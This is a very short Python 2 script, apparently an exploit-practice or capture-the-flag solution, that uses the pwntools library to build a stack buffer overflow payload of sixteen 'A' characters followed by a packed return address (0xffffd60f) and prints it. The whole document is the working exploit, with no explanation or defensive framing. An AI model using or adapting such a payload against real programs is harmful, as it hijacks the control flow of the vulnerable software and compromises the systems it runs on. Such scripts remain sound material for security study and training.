#!/usr/bin/env python
from pwn import *

offset = 16
address = 0xffffd60f

buffer = "A" * offset + p32(address)

print buffer
